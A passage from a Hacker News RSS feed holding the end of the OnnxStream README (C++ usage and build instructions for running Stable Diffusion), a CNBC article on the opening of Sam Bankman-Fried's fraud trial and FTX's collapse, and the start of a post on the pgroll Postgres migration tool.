    ... // fill the tensor_vector with the tensor data. &quot;tensor_vector&quot; is just an alias to a std::vector with a custom allocator.

    Tensor t;
    t.m_name = &quot;input&quot;;
    t.m_shape = { 1, 4, 64, 64 };
    t.set_vector(std::move(data));
    model.push_tensor(std::move(t));

    model.run();
    
    auto&amp; result = model.m_data[0].get_vector<float>();
    
    ... // process the result: &quot;result&quot; is a reference to the first result of the inference (a tensor_vector<float> as well).

    return 0;
}"><pre>#<span>include</span> <span><span>"</span>onnxstream.h<span>"</span></span>

<span>using</span> <span>namespace</span> <span>onnxstream</span><span>;</span>

<span>int</span> <span>main</span>()
{
    Model model;

    <span><span>//</span></span>
    <span><span>//</span> Optional parameters that can be set on the Model object:</span>
    <span><span>//</span></span>
    <span><span>//</span> model.set_weights_provider( ... ); // specifies a different weights provider (default is DiskPrefetchWeightsProvider)</span>
    <span><span>//</span> model.read_range_data( ... ); // reads a range data file (which contains the clipping ranges of the activations for a quantized model)</span>
    <span><span>//</span> model.write_range_data( ... ); // writes a range data file (useful after calibration)</span>
    <span><span>//</span> model.m_range_data_calibrate = true; // calibrates the model</span>
    <span><span>//</span> model.m_use_fp16_arithmetic = true; // uses FP16 arithmetic during inference (useful if weights are in FP16 precision)</span>
    <span><span>//</span> model.m_use_uint8_arithmetic = true; // uses UINT8 arithmetic during inference</span>
    <span><span>//</span> model.m_use_uint8_qdq = true; // uses UINT8 dynamic quantization (can reduce memory consumption of some models)</span>
    <span><span>//</span> model.m_fuse_ops_in_attention = true; // enables attention slicing</span>
    <span><span>//</span> model.m_attention_fused_ops_parts = ... ; // see the "Attention Slicing" section above</span>
    <span><span>//</span></span>

    model.<span>read_file</span>(<span><span>"</span>path_to_model_folder/model.txt<span>"</span></span>);

    tensor_vector&lt;<span>float</span>&gt; data;
    
    ... <span><span>//</span> fill the tensor_vector with the tensor data. "tensor_vector" is just an alias to a std::vector with a custom allocator.</span>

    Tensor t;
    t.<span>m_name</span> = <span><span>"</span>input<span>"</span></span>;
    t.<span>m_shape</span> = { <span>1</span>, <span>4</span>, <span>64</span>, <span>64</span> };
    t.<span>set_vector</span>(<span>std::move</span>(data));
    model.<span>push_tensor</span>(<span>std::move</span>(t));

    model.<span>run</span>();
    
    <span>auto</span>&amp; result = model.<span>m_data</span>[<span>0</span>].<span>get_vector</span>&lt;<span>float</span>&gt;();
    
    ... <span><span>//</span> process the result: "result" is a reference to the first result of the inference (a tensor_vector&lt;float&gt; as well).</span>

    <span>return</span> <span>0</span>;
}</pre></div>
<p dir="auto">The <code>model.txt</code> file contains all the model operations in ASCII format, as exported from the original ONNX file. Each line corresponds to an operation: for example this line represents a convolution in a quantized model:</p>
<div data-snippet-clipboard-copy-content="Conv_4:Conv*input:input_2E_1(1,4,64,64);post_5F_quant_5F_conv_2E_weight_nchw.bin(uint8[0.0035054587850383684,134]:4,4,1,1);post_5F_quant_5F_conv_2E_bias.bin(float32:4)*output:input(1,4,64,64)*dilations:1,1;group:1;kernel_shape:1,1;pads:0,0,0,0;strides:1,1"><pre><code>Conv_4:Conv*input:input_2E_1(1,4,64,64);post_5F_quant_5F_conv_2E_weight_nchw.bin(uint8[0.0035054587850383684,134]:4,4,1,1);post_5F_quant_5F_conv_2E_bias.bin(float32:4)*output:input(1,4,64,64)*dilations:1,1;group:1;kernel_shape:1,1;pads:0,0,0,0;strides:1,1
</code></pre></div>
<p dir="auto">In order to export the <code>model.txt</code> file and its weights (as a series of <code>.bin</code> files) from an ONNX file for use in OnnxStream, a notebook (with a single cell) is provided (<code>onnx2txt.ipynb</code>).</p>
<p dir="auto">Some things must be considered when exporting a Pytorch <code>nn.Module</code> (in our case) to ONNX for use in OnnxStream:</p>
<ol dir="auto">
<li>When calling <code>torch.onnx.export</code>, <code>dynamic_axes</code> should be left empty, since OnnxStream doesn't support inputs with a dynamic shape.</li>
<li>It is strongly recommended to run the excellent <a href="https://github.com/daquexian/onnx-simplifier">ONNX Simplifier</a> on the exported ONNX file before its conversion to a <code>model.txt</code> file.</li>
</ol>
<h2 tabindex="-1" id="user-content-how-to-build-the-stable-diffusion-example-on-linuxmacwindowstermux" dir="auto"><a href="#how-to-build-the-stable-diffusion-example-on-linuxmacwindowstermux">How to Build the Stable Diffusion example on Linux/Mac/Windows/Termux</a></h2>
<ul dir="auto">
<li><strong>Windows only</strong>: start the following command prompt: <code>Visual Studio Tools</code> &gt; <code>x64 Native Tools Command Prompt</code>.</li>
<li><strong>Mac only</strong>: make sure to install cmake: <code>brew install cmake</code>.</li>
</ul>
<p dir="auto">First you need to build <a href="https://github.com/google/XNNPACK">XNNPACK</a>.</p>
<p dir="auto">Since the function prototypes of XnnPack can change at any time, I've included a <code>git checkout</code> ​​that ensures correct compilation of OnnxStream with a compatible version of XnnPack at the time of writing:</p>
<div data-snippet-clipboard-copy-content="git clone https://github.com/google/XNNPACK.git
cd XNNPACK
git rev-list -n 1 --before=&quot;2023-06-27 00:00&quot; master
git checkout <COMMIT_ID_FROM_THE_PREVIOUS_COMMAND>
mkdir build
cd build
cmake -DXNNPACK_BUILD_TESTS=OFF -DXNNPACK_BUILD_BENCHMARKS=OFF ..
cmake --build . --config Release"><pre><code>git clone https://github.com/google/XNNPACK.git
cd XNNPACK
git rev-list -n 1 --before="2023-06-27 00:00" master
git checkout &lt;COMMIT_ID_FROM_THE_PREVIOUS_COMMAND&gt;
mkdir build
cd build
cmake -DXNNPACK_BUILD_TESTS=OFF -DXNNPACK_BUILD_BENCHMARKS=OFF ..
cmake --build . --config Release
</code></pre></div>
<p dir="auto">Then you can build the Stable Diffusion example.</p>
<p dir="auto"><code>&lt;DIRECTORY_WHERE_XNNPACK_WAS_CLONED&gt;</code> is for example <code>/home/vito/Desktop/XNNPACK</code> or <code>C:\Projects\SD\XNNPACK</code> (on Windows):</p>
<div data-snippet-clipboard-copy-content="git clone https://github.com/vitoplantamura/OnnxStream.git
cd OnnxStream
cd src
mkdir build
cd build
cmake -DMAX_SPEED=ON -DXNNPACK_DIR=<DIRECTORY_WHERE_XNNPACK_WAS_CLONED> ..
cmake --build . --config Release"><pre><code>git clone https://github.com/vitoplantamura/OnnxStream.git
cd OnnxStream
cd src
mkdir build
cd build
cmake -DMAX_SPEED=ON -DXNNPACK_DIR=&lt;DIRECTORY_WHERE_XNNPACK_WAS_CLONED&gt; ..
cmake --build . --config Release
</code></pre></div>
<p dir="auto"><strong>Important:</strong> the MAX_SPEED option allows to increase performance by about 10% in Windows, but by more than 50% on the Raspberry Pi. This option consumes much more memory at build time and the produced executable may not work (as was the case with Termux in my tests). So in case of problems, the first attempt to make is to set MAX_SPEED to OFF.</p>
<p dir="auto">Now you can run the Stable Diffusion example.</p>
<p dir="auto">In the case of <strong>Stable Diffusion 1.5</strong>, the weights for the example can be downloaded from the Releases of this repo (about 2GB). In the case of <strong>Stable Diffusion XL 1.0 Base</strong>, the weights can be downloaded from Hugging Face (about 8GB):</p>
<div data-snippet-clipboard-copy-content="git lfs install
git clone --depth=1 https://huggingface.co/vitoplantamura/stable-diffusion-xl-base-1.0-onnxstream"><pre><code>git lfs install
git clone --depth=1 https://huggingface.co/vitoplantamura/stable-diffusion-xl-base-1.0-onnxstream
</code></pre></div>
<p dir="auto">These are the command line options of the Stable Diffusion example:</p>
<div data-snippet-clipboard-copy-content="--xl                Runs Stable Diffusion XL 1.0 instead of Stable Diffusion 1.5.
--models-path       Sets the folder containing the Stable Diffusion models.
--ops-printf        During inference, writes the current operation to stdout.
--output            Sets the output PNG file.
--decode-latents    Skips the diffusion, and decodes the specified latents file.
--prompt            Sets the positive prompt.
--neg-prompt        Sets the negative prompt.
--steps             Sets the number of diffusion steps.
--save-latents      After the diffusion, saves the latents in the specified file.
--decoder-calibrate (ONLY SD 1.5) Calibrates the quantized version of the VAE decoder.
--decoder-fp16      (ONLY SD 1.5) During inference, uses the FP16 version of the VAE decoder.
--not-tiled         (ONLY SDXL 1.0) Don't use the tiled VAE decoder.
--rpi               Configures the models to run on a Raspberry Pi.
--rpi-lowmem        (ONLY SDXL 1.0) Configures the models to run on a Raspberry Pi Zero 2."><pre><code>--xl                Runs Stable Diffusion XL 1.0 instead of Stable Diffusion 1.5.
--models-path       Sets the folder containing the Stable Diffusion models.
--ops-printf        During inference, writes the current operation to stdout.
--output            Sets the output PNG file.
--decode-latents    Skips the diffusion, and decodes the specified latents file.
--prompt            Sets the positive prompt.
--neg-prompt        Sets the negative prompt.
--steps             Sets the number of diffusion steps.
--save-latents      After the diffusion, saves the latents in the specified file.
--decoder-calibrate (ONLY SD 1.5) Calibrates the quantized version of the VAE decoder.
--decoder-fp16      (ONLY SD 1.5) During inference, uses the FP16 version of the VAE decoder.
--not-tiled         (ONLY SDXL 1.0) Don't use the tiled VAE decoder.
--rpi               Configures the models to run on a Raspberry Pi.
--rpi-lowmem        (ONLY SDXL 1.0) Configures the models to run on a Raspberry Pi Zero 2.
</code></pre></div>
<h2 tabindex="-1" id="user-content-credits" dir="auto"><a href="#credits">Credits</a></h2>
<ul dir="auto">
<li>The Stable Diffusion implementation in <code>sd.cpp</code> is based on <a href="https://github.com/fengwang/Stable-Diffusion-NCNN">this project</a>, which in turn is based on <a href="https://github.com/EdVince/Stable-Diffusion-NCNN">this project</a> by @EdVince. The original code was modified in order to use OnnxStream instead of NCNN.</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[$8B Sam Bankman-Fried criminal trial starts today (135 pts)]]></title>
            <link>https://www.cnbc.com/2023/10/03/sam-bankman-fried-criminal-trial-starts-today-heres-whats-at-stake.html</link>
            <guid>37752406</guid>
            <pubDate>Tue, 03 Oct 2023 14:24:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2023/10/03/sam-bankman-fried-criminal-trial-starts-today-heres-whats-at-stake.html">https://www.cnbc.com/2023/10/03/sam-bankman-fried-criminal-trial-starts-today-heres-whats-at-stake.html</a>, See on <a href="https://news.ycombinator.com/item?id=37752406">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="SpecialReportArticle-ArticleBody-6" data-module="ArticleBody" data-test="articleBody-2" data-analytics="SpecialReportArticle-articleBody-6-2"><div id="Placeholder-ArticleBody-Video-107310490" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000317593" aria-labelledby="Placeholder-ArticleBody-Video-107310490"><p><img src="https://image.cnbcfm.com/api/v1/image/107310499-16963292803ED2-REQ-100323-WEX-Sigalos.jpg?v=1696329444&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Sam Bankman-Fried criminal trial begins in New York"><span></span><span></span></p></div><div><p>A year ago, Sam Bankman-Fried was revered as a titan of the industry and living large at a <a href="https://www.theguardian.com/technology/2022/nov/14/sam-bankman-fried-bahamas-penthouse-ftx-crypto" target="_blank">$40 million penthouse in the Bahamas</a>, while he ran a crypto empire valued at $32 billion. On Tuesday morning in a Manhattan federal court in New York, the now disgraced founder and ex-CEO of the bankrupt crypto exchange FTX will stand trial for allegedly masterminding&nbsp;one of the&nbsp;<a href="https://www.cnbc.com/2023/10/02/ftx-customers-who-lost-fortune-are-doubling-down-on-crypto-.html">biggest financial frauds</a>&nbsp;in U.S. history.</p><p>Here is what you need to know about the multi-week trial that starts today, the government's case against 31-year-old Bankman-Fried, and how we got here.</p></div><h2><a id="headline0"></a>The trial(s) against Sam Bankman-Fried</h2><div><p>Tuesday marks the start of the first of two separate criminal trials against the man once celebrated as a titan of the industry.</p><p>In the first trial, Bankman-Fried faces seven criminal counts related to the collapse of the crypto empire he built, including wire fraud, securities fraud and money laundering.</p><p><a href="https://storage.courtlistener.com/recap/gov.uscourts.nysd.590940/gov.uscourts.nysd.590940.202.0.pdf" target="_blank">A superseding&nbsp;indictment&nbsp;alleges</a> that Bankman-Fried&nbsp;misused billions of dollars worth of customer money for personal purchases, including buying more than $200 million of upscale real estate properties in the Bahamas, as well as to cover bad bets made at his crypto hedge fund, Alameda Research. The government says customer cash was shuttled to Alameda via two channels: Users depositing cash directly into accounts held by Alameda and through a secret backdoor that was baked into FTX's code.</p><p>Prosecutors from the Southern District of New York, who contend that <a href="https://www.cnbc.com/2022/12/18/how-sam-bankman-fried-ran-8-billion-fraud-government-prosecutors.html">more than $8 billion of customers' money has gone missing</a>, also allege that Bankman-Fried defrauded FTX investors by covering up the scheme.</p><p>The government has separately accused SBF of using customer funds <a href="https://www.cnbc.com/2023/10/02/sam-bankman-fried-considered-paying-trump-5-billion-not-to-run-lewis.html">to make more than $100 million in campaign contributions</a> for the 2022 midterm elections.</p><p>The full list of charges are:</p><ul><li>Conspiracy to commit wire fraud on customers of FTX.</li><li>Wire fraud on customers of FTX.</li><li>Conspiracy to commit wire fraud on lenders to Alameda Research.</li><li>Wire fraud on lenders to Alameda Research.</li><li>Conspiracy to commit fraud on customers of FTX in connection with purchase and sale of derivatives.</li><li>Conspiracy to commit securities fraud on investors in FTX.</li><li>Conspiracy to commit money laundering.</li></ul><p>A conviction on all counts could land him more than 100 years in prison. Bankman-Fried, who is the son of two Stanford legal scholars, has pleaded not guilty to all charges.</p><p>Bankman-Fried's criminal trial is expected to last up to six weeks, and it kicks off at 9:30 a.m. ET on Tuesday with jury selection. From there, the prosecution will take roughly four weeks to lay out its case, and the defense will take another one to two weeks to present its side.</p><p>It's not yet known whether Bankman-Fried will testify, but the witness roster is expected to include his top deputies at FTX and Alameda, who also happened to comprise his innermost social circle before his crypto empire imploded.</p><p>The list of cooperating witnesses anticipated to take the stand include Bankman-Fried's ex-girlfriend, Caroline Ellison, and his ex-best friend from high school math camp and former MIT roommate, Gary Wang.</p><p>Ellison, who is the former chief executive of Alameda Research, and <a href="https://www.cnbc.com/2022/12/22/ftxs-gary-wang-alamedas-caroline-ellison-plead-guilty-to-federal-charges-cooperating-with-prosecutors.html">FTX co-founder</a> Wang, both pleaded guilty in December to multiple charges and have been cooperating with the U.S. attorney's office in Manhattan for months.</p><p>Since August, Bankman-Fried has been held in a jail in Brooklyn, New York, after having his multimillion-dollar bail revoked for witness tampering, after allegedly leaking to The New York Times the private diary entries of Ellison, who is expected to be a star witness for the prosecution.</p><p><a href="https://storage.courtlistener.com/recap/gov.uscourts.nysd.590940/gov.uscourts.nysd.590940.305.0.pdf" target="_blank">Court documents filed so far</a> indicate that lawyers for Bankman-Fried could present an "advice of counsel" defense. That's where they would say that he was following the guidance of FTX lawyers and didn't realize that what he was doing was illegal. <a href="https://storage.courtlistener.com/recap/gov.uscourts.nysd.590939/gov.uscourts.nysd.590939.303.0.pdf" target="_blank">Judge Lewis Kaplan has already ruled</a>, however, that this defense strategy cannot be included in their opening remarks since it might risk prejudicing the jury from the start.</p><p>A second criminal trial is slated for March 2024 that will deal with additional charges brought after Bankman-Fried's extradition to the U.S. from FTX's headquarters in the Bahamas.</p></div><div id="ArticleBody-InlineImage-107150145" data-test="InlineImage"><p>Samuel Bankman-Fried's poster in downtown San Francisco.</p><p>MacKenzie Sigalos | CNBC</p></div><h2><a id="headline1"></a>How we got here</h2><div><p>The Kimchi Swap put Sam Bankman-Fried on the map.</p><p>The year was 2017, and the ex-Jane Street Capital quant trader noticed something funny when he looked at the page on CoinMarketCap.com listing the price of <span data-test="QuoteInBody" id="SpecialReportArticle-QuoteInBody-9"><a href="https://www.cnbc.com/quotes/BTC.CB=/">bitcoin</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> on exchanges around the world. Today, that price is pretty much uniform across the exchanges, but back then, <a href="https://www.cnbc.com/video/2022/09/15/cnbc-pro-exclusive-30-year-old-crypto-billionaire-shares-his-secrets.html">Bankman-Fried previously told CNBC</a>, he would sometimes see a 60% difference in the value of the coin. His immediate instinct, he said, was to get in on the arbitrage trade — buying bitcoin on one exchange, selling it back on another exchange, and then earning a profit equivalent to the price spread.</p><p>"That's the lowest hanging fruit," Bankman-Fried said in September.</p><p>The arbitrage opportunity was especially compelling in South Korea, where the exchange-listed price of bitcoin was significantly more than in other countries. It was dubbed the Kimchi Premium — a reference to the traditional Korean side dish of salted and fermented cabbage.</p><p>After a month of personally dabbling in the market, Bankman-Fried launched his own trading house, Alameda Research — named after his hometown of Alameda, California, near San Francisco — to scale the opportunity and work on it full time. <a href="https://www.cnbc.com/2022/09/16/how-billionaire-bankman-fried-survived-the-slump-and-still-expanded.html">Bankman-Fried said</a> in an interview with CNBC that the firm sometimes made as much as a million dollars a day.</p><p>Part of why SBF earned street cred for carrying out a relatively straightforward trading strategy was because it wasn't the easiest thing to execute on crypto rails five years ago. Bitcoin arbitrage involved setting up connections to each one of the trading platforms, as well as building out other complicated infrastructure to abstract away a lot of the operational aspects of making the trade. Bankman-Fried's Alameda became very good at that, and the money rolled in.</p><p>From there, the SBF empire ballooned.</p><p>Alameda's success spurred the launch of crypto exchange FTX. In April 2019, Bankman-Fried and Wang — along with University of California, Berkeley, graduate&nbsp;<a href="https://www.cnbc.com/2022/12/06/former-ftx-engineer-quietly-became-millionaire-democratic-donor.html">Nishad Singh</a>&nbsp;— founded FTX.com, an international cryptocurrency exchange that offered customers innovative trading features, a responsive platform and a reliable experience. FTX's success begat a <a href="https://www.cnbc.com/2022/07/06/crypto-exchange-ftx-has-a-few-billion-to-support-industry-bankman-fried-says.html">$2 billion venture fund</a> that seeded other crypto firms. Bankman-Fried's personal wealth grew to around <a href="https://www.nbcnews.com/business/business-news/sam-bankman-fried-ftx-trial-begins-tuesday-what-know-rcna117591" target="_blank">$26 billion at its peak</a>.</p><p>Bankman-Fried was suddenly the poster boy for crypto everywhere, and the FTX logo adorned everything from Formula One race cars to a Miami basketball arena. He went on an endless press tour, bragged about having a balance sheet that <a href="https://www.ft.com/content/c8ffb228-1dbe-4e8a-b30b-be7203d71e7d" target="_blank">could one day buy Goldman Sachs</a>, and became a fixture in Washington, where he was one of the Democratic Party's top donors, <a href="https://www.cnbc.com/2022/05/24/crypto-billionaire-says-he-could-spend-a-record-breaking-1-billion-in-2024-election.html">promising to sink $1 billion</a>&nbsp;into U.S. political races&nbsp;<a href="https://www.cnbc.com/2022/10/14/sam-bankman-fried-backtracks-from-1-billion-political-donation.html">before later backtracking</a>.</p><p>It was all a mirage.</p><p>As crypto prices tanked in 2022, Bankman-Fried boasted that he and his enterprise were immune. But in fact, the sectorwide wipeout hit his operation quite hard. Alameda borrowed money to invest in failing digital asset firms in the spring and summer of 2022 to keep the industry afloat, then reportedly siphoned off FTX customers' deposits to stave off margin calls and meet immediate debt obligations. A fight on Twitter, now known as X, with the CEO of rival exchange Binance pulled the mask off the scheme.</p><p>Alameda, FTX and a host of subsidiaries Bankman-Fried founded filed for bankruptcy protection in Delaware. Bankman-Fried <a href="https://www.bloomberg.com/news/articles/2022-11-08/sbf-net-worth-is-eviscerated-in-days-with-binance-set-to-buy-ftx?=true&amp;amp;sref=ctSjKj2N" target="_blank">lost 94% of his personal wealth in a single day</a>; was arrested in the Bahamas; was subsequently extradited to the U.S. and taken into custody; was released on a $250 million bail to his parents' California home; and then later remanded back into custody for alleged witness tampering.</p><p>Meanwhile, <a href="https://www.cnbc.com/2022/12/13/cftc-piles-on-with-new-charges-against-bankman-fried.html">federal prosecutors and regulators</a>&nbsp;have accused Bankman-Fried of not just having perpetrated a fraud, but having done so "from the start," according to a filing from the Securities Exchange Commission.</p><p><a href="https://www.sec.gov/litigation/complaints/2022/comp-pr2022-219.pdf" target="_blank">SEC</a>&nbsp;and&nbsp;<a href="https://www.cftc.gov/media/7986/enfftxtradingcomplaint121322/download" target="_blank">Commodity Futures Trading Commission</a>&nbsp;regulators, alongside federal prosecutors from the&nbsp;<a href="https://www.justice.gov/usao-sdny/press-release/file/1557571/download" target="_blank">United States Attorney's Office for the Southern District of New York</a>, say that Bankman-Fried was at the heart — indeed, the driver — of "one of the biggest financial frauds in American history," in the words of U.S. Attorney Damian Williams.</p><p>Federal regulators at the CFTC say<strong>&nbsp;</strong>that just a month after founding FTX.com, Bankman-Fried, "unbeknownst to all but a small circle of insiders," was leveraging customer assets — specifically, customers' personal cryptocurrency deposits — for Alameda's own bets.&nbsp;</p><p>Rehypothecation is the term for when businesses legally use customer assets to speculate and invest. But Bankman-Fried didn't have permission from customers to gamble with their funds. FTX's own terms of use specifically forbade him, or Alameda, from using customer money for anything — unless the customer allowed it.</p><p>And from FTX's inception, there was a lot of customer money. The CFTC cited 2019 reports from FTX which pegged the futures volume alone as often exceeding $100 million every day.</p><p>Using customer money for Alameda's bets constituted fraud, the CFTC alleges. From the very genesis of FTX, regulators allege, Bankman-Fried was using customer funds to bankroll his speculative investments.</p><p>It was a steep fall from hero to villain. But there were a lot of signs.</p></div><div id="Placeholder-ArticleBody-Video-107151465" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000273007" aria-labelledby="Placeholder-ArticleBody-Video-107151465"><p><img src="https://image.cnbcfm.com/api/v1/image/107151482-Screen_Shot_2022-11-14_at_33524_PM.png?v=1668458177&amp;w=750&amp;h=422&amp;vtcrop=y" alt="The risk of an FTX crypto contagion"><span></span><span></span></p></div><h2><a id="headline2"></a>A lousy crypto hedge fund</h2><div><p>Despite the deck being stacked in Alameda's favor, the hedge fund offered terrible returns. A&nbsp;<a href="https://ecf.deb.uscourts.gov/doc1/042020651696" target="_blank">court filing</a>&nbsp;indicated that Alameda lost more than $3.7 billion over its lifetime, despite public statements by FTX leaders touting how profitable the trading arm was.</p><p>Alameda's losses and lending structure were a critical component of FTX's eventual collapse.</p><p>Alameda didn't just allegedly play fast and loose with customer money. The hedge fund borrowed aggressively from multiple lenders, including Voyager Digital and BlockFi Lending. Both those companies entered Chapter 11 bankruptcy proceedings in 2022, and FTX targeted both for acquisition.</p><p>Alameda secured its loans from Voyager and BlockFi with FTT tokens, which FTX minted itself. Bankman-Fried's empire controlled the vast majority of the available currency, with only a small amount of FTT actually circulating at any time.</p><p>Alameda should have acknowledged the fact that its tokens couldn't be sold at the price that they claimed they were worth, the CFTC alleges in its complaint.&nbsp;</p><p>This was because any attempt by Alameda to sell off their FTT tokens would crater FTT's price, given how much of the available supply Alameda controlled.</p><p>Instead of correctly marking its tokens to market, though, Alameda marked their entire hoard of FTT at the prevailing market price.</p><p>Alameda used this methodology with other coins as well, including Solana and Serum (a token created and promoted by FTX and Alameda), using them to collateralize billions in loans to other crypto players. Industry insiders even had a nickname for those tokens — "Sam coins."</p><p>The tables began to turn in May 2022 after the collapse of Luna, a stablecoin whose implosion and subsequent crash devastated other lenders and crypto firms and sent crypto prices plunging. Major Alameda lenders, like Voyager, declared bankruptcy. Remaining lenders began to execute margin calls or liquidate open positions with customers, including Alameda.</p><p>The CFTC alleges that between May and June 2022, Alameda was subjected to "a large number of margin calls and loan recalls."</p><p>Unbeknownst to investors, lenders, or regulators, Alameda lacked enough liquid assets to service its loan obligations.</p><p>But while Alameda was illiquid, FTX's customers — who had been constantly reassured that the exchange, and Bankman-Fried, were determined to protect their interests — were not.&nbsp;</p></div><div id="Placeholder-ArticleBody-Video-107151062" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000272922" aria-labelledby="Placeholder-ArticleBody-Video-107151062"><p><img src="https://image.cnbcfm.com/api/v1/image/107151086-Screen_Shot_2022-11-14_at_70047_AM.png?v=1668427305&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Binance, Crypto.com CEOs race to reassure customers funds are safe"><span></span><span></span></p></div><h2><a id="headline3"></a>The fraud — exposed</h2><div><p>Bankman-Fried stepped down from his leadership position at Alameda Research in Oct. 2021<strong>&nbsp;</strong>in what CFTC regulators claim was a calculated bid to cultivate a false sense of separation between FTX and the hedge fund. But he continued to exercise control, regulators claim.</p><p>Bankman-Fried allegedly ordered Alameda to increase its use of customer assets, drawing down massively on its "unlimited" credit line at FTX.</p><p>"Alameda was able to rely on its undisclosed ordinary-course access to FTX credit and customer funds to facilitate these large withdrawals, which were several billion dollars in notional value," the CFTC filing reads.</p><p>By the middle of 2022, Alameda owed FTX's unwitting customers approximately $8 billion. Bankman-Fried had testified before the House that FTX boasted world-class risk management and compliance systems, but in reality, according to the firm's own bankruptcy filings, it possessed almost nothing in the way of record-keeping.</p><p>Then, on Nov. 2, the first domino fell. Crypto trade publication CoinDesk&nbsp;<a href="https://www.coindesk.com/business/2022/11/02/divisions-in-sam-bankman-frieds-crypto-empire-blur-on-his-trading-titan-alamedas-balance-sheet/" target="_blank">publicized details</a>&nbsp;on Alameda's balance sheet which showed $14.6 billion in assets. Over $7 billion of those assets were either FTT tokens or Bankman-Fried-backed coins like Solana or Serum. Another $2 billion were locked away in equity investments.</p><p>For the first time ever, the secretive inner workings of Alameda Research were revealed to be a Potemkin village. Investors began to liquidate their FTT tokens and withdraw their holdings from FTX, a potentially calamitous situation for Bankman-Fried.</p><p>Alameda still had billions of collateralized loans outstanding — but if the value of their collateral, FTT, fell too far, their lenders would execute further margin calls, demanding full repayment of loans.</p><p>Allegedly, Alameda had already been unable to fulfill loan obligations over the summer without accessing customer funds. Now, with money flowing out of the exchange and FTT's price slipping, Alameda and FTX faced a liquidity crunch.</p><p>In a now-deleted tweet, Bankman-Fried continued to claim FTX was fully funded and that customer assets were safe<strong>.</strong>&nbsp;But on Nov. 6, 2022, four days after the CoinDesk article, the crack widened into a chasm, thanks to an old investor-turned-rival, Changpeng "CZ" Zhao.</p><p>Zhao founded Binance in 2017, and it was the first outside investor in FTX, funding a Series A round in 2019. FTX bought out Binance in 2021 with a combination of FTT and other coins, according to Zhao.</p><p>Zhao dropped the hammer with a&nbsp;<a href="https://twitter.com/cz_binance/status/1589283421704290306" target="_blank">tweet</a>&nbsp;saying that because of "recent revelations that have came [sic] to light, we have decided to liquidate any remaining FTT on our books."</p><p>FTX executives scrambled to contain the damage, and Alameda traders managed to fend off outflows for two days, holding the price of FTT at around $22.</p><p>Publicly, Bankman-Fried continued to operate as if all was well. "FTX is fine. Assets are fine," he wrote in a tweet<strong>&nbsp;</strong>on Nov. 7 that has since been deleted.</p><p>But at the same time Bankman-Fried was tweeting reassurances, internally, executives were growing more and more alarmed at the increasing shortfall, according to prosecutors. Bankman-Fried and other executives admitted to each other that "FTX customer funds were irrevocably lost because Alameda had appropriated them."</p><p>It was an admission that flew in the face of everything Bankman-Fried would claim publicly up through the day of his arrest, a month later.</p><p>By Nov. 8, the shortfall had grown from $1 billion to $8 billion. Bankman-Fried had been courting outside investors for a rescue package, but everyone declined.</p><p>FTX issued a pause on all customer withdrawals that day. FTT's price plummeted by over 75%. Bankman-Fried was in the midst of a high-tech, decentralized run on the bank. Out of options, he turned to Zhao, who announced that he'd signed a "non-binding" letter of intent to acquire FTX.com.</p><p>But just a day later, on Nov. 9, Binance said it would not go through with the acquisition, citing reports of "mishandled customer funds" and federal investigations.</p><p>Two days later, Bankman-Fried resigned as CEO of FTX and associated entities. FTX's longtime attorneys at Sullivan &amp; Cromwell approached John J. Ray, who oversaw Enron through its bankruptcy, to assume Bankman-Fried's former position.</p><p>FTX filed for bankruptcy that same day, on Nov. 11, 2022. A month later, Bankman-Fried was arrested by Bahamian authorities, pending extradition on charges of fraud, conspiracy, and money laundering.</p><p>Bankman-Fried, a devotee of a philosophy known as "<a href="https://www.vox.com/future-perfect/23500014/effective-altruism-sam-bankman-fried-ftx-crypto" target="_blank">effective altruism</a>," was apparently driven by an obsessive need to quantify the impact he had on this world, measured in dollars and tokens. He drafted a spreadsheet which measured the influence that Alameda had on the planet (and determined it was nearly a net wash).&nbsp;</p><p>Billions of dollars of customer money were left floating in venture funds, political war chests and charitable coffers, although John Ray's team has clawed back more than $7 billion so far.</p><p>Almost a decade ago, Bankman-Fried posed a hypothetical question to his friends and family on his personal blog: Waxing poetic on effective altruism, he asked rhetorically, "Just how much impact can a dollar have?"</p><p>"Well, if you want a one-sentence answer, here it is: one two thousandth of a life," he said.</p><p>The CFTC alleges that over $8 billion of customer funds are missing. Some customers have doubtless lost their life savings, their kid's college funds, their future down payments. By Bankman-Fried's own math, his alleged misdeeds were worth four million lives.</p><p>— <em>CNBC's Rohan Goswami contributed to this report.</em></p></div><div id="Placeholder-ArticleBody-Video-107307637" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000317145" aria-labelledby="Placeholder-ArticleBody-Video-107307637"><p><img src="https://image.cnbcfm.com/api/v1/image/107307638-FTX_Title.png?v=1696237201&amp;w=750&amp;h=422&amp;vtcrop=y" alt="The Collapse of FTX: Insiders Tell All"><span></span><span></span></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pgroll: zero-downtime, undoable, schema migrations for Postgres (291 pts)]]></title>
            <link>https://xata.io/blog/pgroll-schema-migrations-postgres</link>
            <guid>37752366</guid>
            <pubDate>Tue, 03 Oct 2023 14:20:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xata.io/blog/pgroll-schema-migrations-postgres">https://xata.io/blog/pgroll-schema-migrations-postgres</a>, See on <a href="https://news.ycombinator.com/item?id=37752366">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Database schema migrations can be a double-edged sword. They are essential for keeping our systems up to date and in sync with evolving application requirements, but often <a href="https://xata.io/blog/postgres-schema-changes-pita">come bundled with a set of challenges</a> that can leave even the most seasoned developers and database administrators scratching their heads (or banging them on the keyboard).</p>
